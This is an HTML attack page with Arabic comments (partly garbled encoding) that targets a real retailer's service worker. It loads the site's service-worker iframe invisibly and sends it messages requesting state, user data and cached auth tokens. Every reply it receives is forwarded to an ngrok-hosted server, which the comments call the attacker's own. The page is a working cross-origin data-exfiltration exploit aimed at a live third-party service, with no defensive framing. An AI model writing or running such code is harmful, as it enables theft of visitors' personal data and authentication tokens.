<!DOCTYPE html>
<html>
<body style="background: #111; color: #0f0;">
    <h1>ุฌุงุฑู ุงุณุชุฌูุงุจ ุงููุญุฑู (Service Worker Interrogation)...</h1>
    
    <iframe id="sw_bridge" 
            src="https://stm.zooplus.com/_/service_worker/6240/sw_iframe.html?origin=https://egyhaker.github.io&1p=1" 
            style="width:0; height:0; border:none;"></iframe>

    <script>
        const bridge = document.getElementById('sw_bridge');

        // ูุธููุฉ ูุฅุฑุณุงู ุฑุณุงูุฉ ุฅูู ุงูู Service Worker ุนุจุฑ ุงูุฅุทุงุฑ ุงููุณูุท
        function sendToSW(command) {
            console.log("[โ] ุฅุฑุณุงู ุฃูุฑ ููู SW:", command);
            bridge.contentWindow.postMessage(command, "https://stm.zooplus.com");
        }

        window.addEventListener("message", function(event) {
            // ุงูุชุญูู ูู ุฃู ุงูุฑุณุงูุฉ ูู ุงูุฌุณุฑ
            if (event.origin.includes("zooplus.com")) {
                console.log("%c[๐ฅ] ุฑุฏ ูุณุชูู ูู ุงูู SW:", "color: #00ffff; font-weight: bold;");
                console.log(event.data);

                // ุฅุฑุณุงู ุงูุตูุฏ ูุณูุฑูุฑู
                fetch("https://subsphenoidal-dauntlessly-pura.ngrok-free.dev/sw-capture", {
                    method: "POST",
                    body: JSON.stringify({
                        origin: event.origin,
                        payload: event.data
                    })
                });
            }
        });

        // ุงูุงูุชุธุงุฑ ุญุชู ูุชู ุชุญููู ุงูุฅุทุงุฑ ุซู ุงูุจุฏุก ูู ุงูุงุณุชุฌูุงุจ
        bridge.onload = () => {
            console.log("[!] ุงูุฌุณุฑ ุฌุงูุฒ. ูุจุฏุฃ ุงูุงุณุชุฌูุงุจ...");
            
            // ูุญุงููุฉ 1: ุทูุจ ุงูุญุงูุฉ ุงูุนุงูุฉ
            sendToSW({ type: 'GET_STATE' });

            // ูุญุงููุฉ 2: ุทูุจ ุจูุงูุงุช ุงููุณุชุฎุฏู (Common pattern in Google/GTM SWs)
            sendToSW({ type: 'GET_USER_DATA' });

            // ูุญุงููุฉ 3: ุทูุจ ุงูุชูููุงุช ุงููุฎุฒูุฉ ูู ุงูู Cache
            sendToSW({ type: 'FETCH_AUTH_TOKENS' });
        };
    </script>
</body>
</html>
